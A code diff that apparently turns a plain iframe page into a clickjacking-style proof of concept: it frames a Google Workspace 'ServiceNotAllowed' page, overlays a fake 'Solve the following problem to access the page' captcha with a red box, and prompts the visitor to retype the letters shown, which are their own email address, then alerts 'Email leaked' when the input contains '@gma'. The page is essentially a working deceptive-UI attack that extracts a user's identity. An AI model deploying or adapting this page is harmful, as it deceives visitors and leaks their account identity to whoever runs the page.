@@ -1,36 +1,70 @@
-<!DOCTYPE html>
-<html lang="id">
-<head>
-  <meta charset="UTF-8">
-  <title>Auto Copy Iframe</title>
-</head>
+<meta name="referrer" content="no-referrer" />
 
-<body>
+<iframe
+    width="500px"
+    height="500px"
+    frameborder="0"
+    style="position: fixed; top:-15px; display:none;"
+    onload="load()"
+    src="https://access.workspace.google.com/u/0/ServiceNotAllowed?application=216932279217&source=scrip&continue=https://chat.google.com/?authuser%3D1&pli=1">
+</iframe>
 
-  <iframe
-    id="targetFrame"
-    src="https://access.workspace.google.com/u/0/ServiceNotAllowed?application=216932279217&source=scrip&continue=https://chat.google.com/?authuser%3D1&pli=1"
-    width="500"
-    height="500">
-  </iframe>
-  
-  <script>
-    const iframe = document.getElementById("targetFrame");
+<div
+    style="position:fixed;top:0px;z-index:100;border-style:groove;border-color:red;border-width:5px;display:none;">
+    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</div>
 
-    iframe.addEventListener("load", async () => {
-      try {
-        // Ambil teks yang dirender di iframe
-        const text = iframe.contentDocument.body.innerText;
+<div style="position:fixed;top:30px;z-index:100;background-color:grey;">
 
-        // Copy otomatis
-        await navigator.clipboard.writeText(text);
+    <h3>Loading...</h3>
 
-        console.log("Auto-copy berhasil");
-      } catch (error) {
-        console.error("Auto-copy gagal:", error);
-      }
+    <b></b><br>
+
+    <textarea id="answer"></textarea>
+
+    <br><br><br>
+
+</div>
+
+<script>
+function load() {
+    document.querySelector('h3').textContent =
+        'Solve the following problem to access the page.';
+
+    document.querySelector('iframe').style =
+        'position:fixed;top:-15px;display:block;';
+
+    document.querySelector('div').style.display = 'block';
+
+    document.querySelector('b').textContent =
+        'Type letters inside the redbox to below textbox:';
+
+    const text = document.querySelector('#answer');
+
+    // Event ketika isi textarea berubah
+    text.addEventListener('input', () => {
+        if (text.value.includes('@gma')) {
+            alert(`Email leaked:\n${text.value}`);
+        } else {
+            alert('Wrong letters. Try again!');
+        }
     });
-  </script>
 
-</body>
-</html>
+    // DOUBLE-CLICK → COPY ISI TEXTAREA
+    text.addEventListener('dblclick', async () => {
+        const value = text.value;
+
+        if (!value) {
+            return;
+        }
+
+        try {
+            await navigator.clipboard.writeText(value);
+
+            console.log('Berhasil dicopy:', value);
+        } catch (error) {
+            console.error('Gagal copy:', error);
+        }
+    });
+}
+</script>
